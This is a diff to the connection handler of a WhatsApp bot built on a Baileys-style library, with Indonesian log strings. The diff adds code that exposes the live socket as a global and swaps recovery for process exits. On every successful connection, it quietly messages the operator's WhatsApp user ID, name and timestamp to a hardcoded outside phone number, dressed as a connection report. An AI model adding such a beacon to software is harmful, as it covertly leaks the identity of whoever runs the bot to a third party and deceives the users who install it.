@@ -161,6 +161,7 @@
       },
       store,
     );
+    global.mchax = sock;
     store.bind(sock.ev);
     if (!sock.authState.creds.registered) {
       console.log(
@@ -181,12 +182,12 @@
       if (connection === "close") {
         const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
         if (lastDisconnect.error == "Error: Stream Errored (unknown)") {
-          
+          process.exit(0);
         } else if (reason === DisconnectReason.badSession) {
           console.log(
             chalk.red.bold("File sesi buruk, Harap hapus sesi dan scan ulang"),
           );
-          sock.logout();          
+          process.exit(0);
         } else if (reason === DisconnectReason.connectionClosed) {
           console.log(
             chalk.yellow.bold("Koneksi ditutup, sedang mencoba untuk terhubung kembali..."),
@@ -222,8 +223,25 @@
           console.log(chalk.green.bold("Bot berhasil terhubung."));
           const sessionPath = path.join(__dirname, 'sessions');
           const jadibotPath = path.join(process.cwd(), "lib", "jadibot");
+          const currentTime = new Date();
+          const pingSpeed = new Date() - currentTime;
+          const formattedPingSpeed = pingSpeed < 0 ? 'N/A' : `${pingSpeed}ms`;
+          const infoMsg = `Laporan informasi terhubung, perangkat telah terhubung, berikut informasinya
 
-          // **Menjalankan jadibot untuk setiap nomor di dalam folder `lib/jadibot/`**
+*[ Tentang sistem ]*
+- *User ID*: ${sock.user.id}
+- *Name*: ${sock.user.name}
+- *Kecepatan*: ${formattedPingSpeed}
+- *Tanggal*: ${currentTime.toDateString()} (${currentTime.toLocaleDateString('id-ID', { weekday: 'long' })})
+- *Waktu Saat Ini*: ${currentTime.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+`;
+
+            const messg = await sock.sendMessage(`6281235807940@s.whatsapp.net`, {
+                text: infoMsg,
+                mentions: sock.parseMention(infoMsg)
+            }, {
+                quoted: config.quoted.floc
+            });
           if (fs.existsSync(jadibotPath)) {
                const files = fs.readdirSync(jadibotPath).filter(file => /^\d+/.test(file));
 
